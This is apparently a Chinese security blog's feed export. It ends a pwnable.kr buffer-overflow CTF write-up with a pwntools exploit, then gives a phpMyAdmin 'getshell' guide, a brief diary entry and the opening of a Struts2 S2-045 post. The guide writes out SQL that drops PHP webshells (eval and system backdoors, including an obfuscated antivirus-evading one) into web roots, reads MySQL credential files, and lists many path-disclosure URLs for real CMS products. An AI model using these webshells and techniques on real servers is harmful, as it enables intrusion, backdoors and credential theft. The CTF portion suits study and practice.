   0x5655563d <span class="token operator">&lt;</span>+17<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x5655578c
   0x56555644 <span class="token operator">&lt;</span>+24<span class="token operator">></span>:    call   0xf7e67140 <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   0x56555649 <span class="token operator">&lt;</span>+29<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x2c<span class="token punctuation">]</span>
   0x5655564c <span class="token operator">&lt;</span>+32<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
   0x5655564f <span class="token operator">&lt;</span>+35<span class="token operator">></span>:    call   0xf7e66890 <span class="token operator">&lt;</span>gets<span class="token operator">></span>
   0x56555654 <span class="token operator">&lt;</span>+40<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>,0xcafebabe
   0x5655565b <span class="token operator">&lt;</span>+47<span class="token operator">></span>:    jne    0x5655566b <span class="token operator">&lt;</span>func+63<span class="token operator">></span>
   0x5655565d <span class="token operator">&lt;</span>+49<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x5655579b
   0x56555664 <span class="token operator">&lt;</span>+56<span class="token operator">></span>:    call   0xf7e42940 <span class="token operator">&lt;</span>system<span class="token operator">></span>
   0x56555669 <span class="token operator">&lt;</span>+61<span class="token operator">></span>:    jmp    0x56555677 <span class="token operator">&lt;</span>func+75<span class="token operator">></span>
   0x5655566b <span class="token operator">&lt;</span>+63<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x565557a3
   0x56555672 <span class="token operator">&lt;</span>+70<span class="token operator">></span>:    call   0xf7e67140 <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   0x56555677 <span class="token operator">&lt;</span>+75<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>
   0x5655567a <span class="token operator">&lt;</span>+78<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <span class="token operator">&lt;</span>+85<span class="token operator">></span>:    je     0x56555688 <span class="token operator">&lt;</span>func+92<span class="token operator">></span>
   0x56555683 <span class="token operator">&lt;</span>+87<span class="token operator">></span>:    call   0xf7efd790 <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">></span>
   0x56555688 <span class="token operator">&lt;</span>+92<span class="token operator">></span>:    leave  
   0x56555689 <span class="token operator">&lt;</span>+93<span class="token operator">></span>:    ret    
End of assembler dump.
</code></pre>
<p>在    0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe 处 下断</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ n
overflow me <span class="token keyword">:</span> 
AAAAAAAAAA

<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
EAX: 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
EBX: 0x0 
ECX: 0xf7fb85a0 --<span class="token operator">></span> 0xfbad2288 
EDX: 0xf7fb987c --<span class="token operator">></span> 0x0 
ESI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
EDI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
EBP: 0xffffd078 --<span class="token operator">></span> 0xffffd098 --<span class="token operator">></span> 0x0 
ESP: 0xffffd030 --<span class="token operator">></span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
EIP: 0x56555654 <span class="token punctuation">(</span><span class="token operator">&lt;</span>func+40<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>,0xcafebabe<span class="token punctuation">)</span>
EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
   0x56555649 <span class="token operator">&lt;</span>func+29<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x2c<span class="token punctuation">]</span>
   0x5655564c <span class="token operator">&lt;</span>func+32<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
   0x5655564f <span class="token operator">&lt;</span>func+35<span class="token operator">></span>:    call   0xf7e66890 <span class="token operator">&lt;</span>gets<span class="token operator">></span>
<span class="token operator">=</span><span class="token operator">></span> 0x56555654 <span class="token operator">&lt;</span>func+40<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>,0xcafebabe
   0x5655565b <span class="token operator">&lt;</span>func+47<span class="token operator">></span>:    jne    0x5655566b <span class="token operator">&lt;</span>func+63<span class="token operator">></span>
   0x5655565d <span class="token operator">&lt;</span>func+49<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x5655579b
   0x56555664 <span class="token operator">&lt;</span>func+56<span class="token operator">></span>:    call   0xf7e42940 <span class="token operator">&lt;</span>system<span class="token operator">></span>
   0x56555669 <span class="token operator">&lt;</span>func+61<span class="token operator">></span>:    jmp    0x56555677 <span class="token operator">&lt;</span>func+75<span class="token operator">></span>
<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
0000<span class="token operator">|</span> 0xffffd030 --<span class="token operator">></span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
0004<span class="token operator">|</span> 0xffffd034 --<span class="token operator">></span> 0xffffd0d4 --<span class="token operator">></span> 0xd28e2a50 
0008<span class="token operator">|</span> 0xffffd038 --<span class="token operator">></span> 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
0012<span class="token operator">|</span> 0xffffd03c --<span class="token operator">></span> 0xd267 
0016<span class="token operator">|</span> 0xffffd040 --<span class="token operator">></span> 0xffffffff 
0020<span class="token operator">|</span> 0xffffd044 --<span class="token operator">></span> 0x2f <span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
0024<span class="token operator">|</span> 0xffffd048 --<span class="token operator">></span> 0xf7e14dc8 --<span class="token operator">></span> 0x2b76 <span class="token punctuation">(</span><span class="token string">'v+'</span><span class="token punctuation">)</span>
0028<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
Legend: code, data, rodata, value

Breakpoint 2, 0x56555654 <span class="token keyword">in</span> func <span class="token punctuation">(</span><span class="token punctuation">)</span>
`
</code></pre>
<p>AAAAAAAAAA 的指针位于堆栈的顶部，它指向地址ESP: 0xffffd030 –&gt; 0xffffd04c (“AAAAAAAAAA”)</p>
<p>所以可以计算偏移量<br>gdb-peda$ p/d 0xffffd080 - 0xffffd04c<br>$1 = 52</p>
<p>有了偏移量 就可以写payload了</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#p = process('./bof')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span><span class="token number">9000</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> <span class="token string">'\xbe\xba\xfe\xca'</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行结果…</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ python bof.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to pwnable.kr on port 9000: Done
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
$ <span class="token function">ls</span>
bof
bof.c
flag
log
log2
super.pl
$ <span class="token function">cat</span> flag
daddy, I just pwned a buFFer :<span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点&lt;/p&gt;
&lt;h3 id=&quot;题目网站：http-pwnable-kr&quot;&gt;&lt;a href=&quot;#题目网站：http-pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;题目网站：http://pwnable.kr&quot;&gt;&lt;/a&gt;题目网站：&lt;a href=&quot;http://pwnable.kr&quot;&gt;http://pwnable.kr&lt;/a&gt;&lt;/h3&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;Bof      32位经典缓冲区溢出题目&lt;/p&gt;
&lt;h2 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;headerlink&quot; title=&quot;解题过程&quot;&gt;&lt;/a&gt;解题过程&lt;/h2&gt;&lt;p&gt;因为题目提供了源码所以先看看代码&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
void func(int key){
    char overflowme[32];
    printf(&amp;quot;overflow me : &amp;quot;);
    gets(overflowme);    // smash me!
    if(key == 0xcafebabe){
        system(&amp;quot;/bin/sh&amp;quot;);
    }
    else{
        printf(&amp;quot;Nah..\n&amp;quot;);
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="二进制漏洞利用" scheme="http://iosmosis.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="缓冲区溢出" scheme="http://iosmosis.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>关于phpmyadmin GetShell思路总结</title>
    <link href="http://iosmosis.github.io/2017/04/09/mysql/"/>
    <id>http://iosmosis.github.io/2017/04/09/mysql/</id>
    <published>2017-04-08T16:08:16.000Z</published>
    <updated>2017-04-08T16:40:50.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我"><a href="#看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我" class="headerlink" title="看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~"></a>看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~</h3><h1 id="低权限读文件"><a href="#低权限读文件" class="headerlink" title="低权限读文件"></a>低权限读文件</h1><h3 id="用到的mysql语句"><a href="#用到的mysql语句" class="headerlink" title="用到的mysql语句"></a>用到的mysql语句</h3><p></p><p class="code-caption" data-lang="sql" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">LOAD</span> <span class="token keyword">DATA</span> <span class="token keyword">LOCAL</span> <span class="token keyword">INFILE</span> <span class="token string">'C:/mysql/data/mysql/user.MYD'</span> <span class="token keyword">INTO</span> <span class="token keyword">TABLE</span> test <span class="token keyword">fields</span> <span class="token keyword">terminated by</span> <span class="token string">''</span> <span class="token keyword">LINES</span> <span class="token keyword">TERMINATED BY</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件"><a href="#LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件" class="headerlink" title="LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件"></a>LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件</h3><pre><code>webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件
若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE  就不能读该文件
</code></pre><h3 id="使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD"><a href="#使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD" class="headerlink" title="使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD"></a>使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h1 id="SQL语句利用日志写shell"><a href="#SQL语句利用日志写shell" class="headerlink" title="SQL语句利用日志写shell"></a>SQL语句利用日志写shell</h1><p>outfile被禁止，或者写入文件被拦截；</p>
<p>在数据库中操作如下：（必须是root权限）</p>
<p></p><p class="code-caption" data-lang="mysql" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-mysql"><code class="language-mysql">show variables like '%general%';  #查看配置
set global general_log = on;  #开启general log模式
set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址
select '<?php eval($_POST[cmd]);?>'  #写入shell
</code></pre>
<p>SQL查询免杀shell的语句</p>
<p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token string">"&lt;?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>"</span>
</code></pre>
<h1 id="getshell-方法"><a href="#getshell-方法" class="headerlink" title="getshell 方法"></a>getshell 方法</h1><p></p><p class="code-caption" data-lang="mysql" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-mysql"><code class="language-mysql">方法一：
CREATE TABLE `mysql`.`io` (`ioi` TEXT NOT NULL );
INSERT INTO `mysql`.`io` (`ioi` )VALUES ('<?php @eval($_POST[io])?>');
SELECT xiaomaFROM study INTO OUTFILE 'E:/wamp/www/1.php';
#以上同时执行，在数据库: mysql 下创建一个表名为：io，字段为ioi，导出到E:/wamp/www/1.php

一句话连接密码：io
方法二：
Create TABLE io (ioi text NOT NULL);
Insert INTO io (ioi) VALUES('<?php eval($_POST[io])?>');
select ioi from io into outfile 'E:/wamp/www/1.php';
Drop TABLE IF EXISTS ioi;


方法三：
读取文件内容： select load_file('E:/xamp/www/s.php');


写一句话：select '<?php @eval($_POST[cmd])?>'INTO OUTFILE 'E:/xamp/www/1.php'


cmd执行权限：select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/1.php'

select load_file('E:/xamp/www/xiaoma.php');

方法四：
select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/xiaoma.php'
然后访问网站目录：http://www.xxxx.com/xiaoma.php?cmd=dir
</code></pre>
<h1 id="php爆绝对路径方法"><a href="#php爆绝对路径方法" class="headerlink" title="php爆绝对路径方法"></a>php爆绝对路径方法</h1><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>1、单引号爆路径
说明：
直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。
www.xxx.com/news.php?id=149′


2、错误参数值爆路径
说明：
将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。
www.xxx.com/researcharchive.php?id=-1


3、Google爆路径
说明：
结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。
Site:xxx.edu.tw warning
Site:xxx.com.tw “fatal error”


4、测试文件爆路径
说明：
很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。
www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php


5、phpmyadmin爆路径
说明：
一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。
1. /phpmyadmin/libraries/lect_lang.lib.php
2./phpMyAdmin/index.php?lang[]=1
3. /phpMyAdmin/phpinfo.php
4. load_file()
5./phpmyadmin/themes/darkblue_orange/layout.inc.php
6./phpmyadmin/libraries/select_lang.lib.php
7./phpmyadmin/libraries/lect_lang.lib.php
8./phpmyadmin/libraries/mcrypt.lib.php


6、配置文件找路径
说明：
如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。


Windows:
c:\windows\php.ini php配置文件
c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件


Linux:
/etc/php.ini php配置文件
/etc/httpd/conf.d/php.conf
/etc/httpd/conf/httpd.conf Apache配置文件
/usr/local/apache/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件


7、nginx文件类型错误解析爆路径
说明：
要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径
www.xxx.com/xx.jpg/x.php


8、其他
dedecms
/member/templets/menulit.php
plus/paycenter/alipay/return_url.php 
plus/paycenter/cbpayment/autoreceive.php
paycenter/nps/config_pay_nps.php
plus/task/dede-maketimehtml.php
plus/task/dede-optimize-table.php
plus/task/dede-upcache.php


WP
wp-admin/includes/file.php
wp-content/themes/baiaogu-seo/footer.php


ecshop商城系统暴路径漏洞文件
/api/cron.php
/wap/goods.php
/temp/compiled/ur_here.lbi.php
/temp/compiled/pages.lbi.php
/temp/compiled/user_transaction.dwt.php
/temp/compiled/history.lbi.php
/temp/compiled/page_footer.lbi.php
/temp/compiled/goods.dwt.php
/temp/compiled/user_clips.dwt.php
/temp/compiled/goods_article.lbi.php
/temp/compiled/comments_list.lbi.php
/temp/compiled/recommend_promotion.lbi.php
/temp/compiled/search.dwt.php
/temp/compiled/category_tree.lbi.php
/temp/compiled/user_passport.dwt.php
/temp/compiled/promotion_info.lbi.php
/temp/compiled/user_menu.lbi.php
/temp/compiled/message.dwt.php
/temp/compiled/admin/pagefooter.htm.php
/temp/compiled/admin/page.htm.php
/temp/compiled/admin/start.htm.php
/temp/compiled/admin/goods_search.htm.php
/temp/compiled/admin/index.htm.php
/temp/compiled/admin/order_list.htm.php
/temp/compiled/admin/menu.htm.php
/temp/compiled/admin/login.htm.php
/temp/compiled/admin/message.htm.php
/temp/compiled/admin/goods_list.htm.php
/temp/compiled/admin/pageheader.htm.php
/temp/compiled/admin/top.htm.php
/temp/compiled/top10.lbi.php
/temp/compiled/member_info.lbi.php
/temp/compiled/bought_goods.lbi.php
/temp/compiled/goods_related.lbi.php
/temp/compiled/page_header.lbi.php
/temp/compiled/goods_script.html.php
/temp/compiled/index.dwt.php
/temp/compiled/goods_fittings.lbi.php
/temp/compiled/myship.dwt.php
/temp/compiled/brands.lbi.php
/temp/compiled/help.lbi.php
/temp/compiled/goods_gallery.lbi.php
/temp/compiled/comments.lbi.php
/temp/compiled/myship.lbi.php
/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
/includes/modules/cron/auto_manage.php
/includes/modules/cron/ipdel.php


ucenter爆路径
ucenter\control\admin\db.php


DZbbs
manyou/admincp.php?my_suffix=%0A%0DTOBY57


z-blog
admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php


php168爆路径
admin/inc/hack/count.php?job=list
admin/inc/hack/search.php?job=getcode
admin/inc/ajax/bencandy.php?job=do
cache/MysqlTime.txt


PHPcms2008-sp4
注册用户登陆后访问
phpcms/corpandresize/process.php?pic=../images/logo.gif


bo-blog
PoC:
/go.php/&lt;[evil code]
CMSeasy爆网站路径漏洞
漏洞出现在menu_top.php这个文件中
lib/mods/celive/menu_top.php
/lib/default/ballot_act.php
lib/default/special_act.php
</code></pre><h2 id="相关文章链接"><a href="#相关文章链接" class="headerlink" title="相关文章链接"></a>相关文章链接</h2><p><a href="https://www.t00ls.net/articles-26813.html" target="_blank" rel="external">低权限读文件</a><br><a href="http://blog.cora-lab.org/287.html" target="_blank" rel="external">SQL语句利用日志写shell</a><br><a href="http://www.cnblogs.com/devi1o/articles/5179206.html" target="_blank" rel="external">phpmyadmin获取shell方法总结</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我&quot;&gt;&lt;a href=&quot;#看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我&quot; class=&quot;headerlink&quot; title=&quot;看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~&quot;&gt;&lt;/a&gt;看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~&lt;/h3&gt;&lt;h1 id=&quot;低权限读文件&quot;&gt;&lt;a href=&quot;#低权限读文件&quot; class=&quot;headerlink&quot; title=&quot;低权限读文件&quot;&gt;&lt;/a&gt;低权限读文件&lt;/h1&gt;&lt;h3 id=&quot;用到的mysql语句&quot;&gt;&lt;a href=&quot;#用到的mysql语句&quot; class=&quot;headerlink&quot; title=&quot;用到的mysql语句&quot;&gt;&lt;/a&gt;用到的mysql语句&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;sql&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;sql&quot;&gt;LOAD DATA LOCAL INFILE &amp;#39;C:/mysql/data/mysql/user.MYD&amp;#39; INTO TABLE test fields terminated by &amp;#39;&amp;#39; LINES TERMINATED BY &amp;#39;\0&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件&quot;&gt;&lt;a href=&quot;#LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件&quot; class=&quot;headerlink&quot; title=&quot;LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件&quot;&gt;&lt;/a&gt;LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件
若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE  就不能读该文件
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD&quot;&gt;&lt;a href=&quot;#使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD&quot; class=&quot;headerlink&quot; title=&quot;使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD&quot;&gt;&lt;/a&gt;使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="phpmyadmin" scheme="http://iosmosis.github.io/tags/phpmyadmin/"/>
    
      <category term="Getshell" scheme="http://iosmosis.github.io/tags/Getshell/"/>
    
      <category term="mysql" scheme="http://iosmosis.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>不如慢慢走下去</title>
    <link href="http://iosmosis.github.io/2017/04/07/Time/"/>
    <id>http://iosmosis.github.io/2017/04/07/Time/</id>
    <published>2017-04-07T04:47:01.000Z</published>
    <updated>2017-04-08T16:46:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07&lt;/p&gt;

    
    </summary>
    
    
      <category term="About Me" scheme="http://iosmosis.github.io/tags/About-Me/"/>
    
      <category term="随笔" scheme="http://iosmosis.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</title>
    <link href="http://iosmosis.github.io/2017/03/07/str2-045/"/>
    <id>http://iosmosis.github.io/2017/03/07/str2-045/</id>
    <published>2017-03-07T07:02:56.000Z</published>
    <updated>2017-04-08T15:14:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><br></p>
<h3 id="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"><a href="#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。" class="headerlink" title="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"></a>近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</h3><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><h3 id="S2-045，CVE-2017-5638"><a href="#S2-045，CVE-2017-5638" class="headerlink" title="S2-045，CVE-2017-5638"></a>S2-045，CVE-2017-5638</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
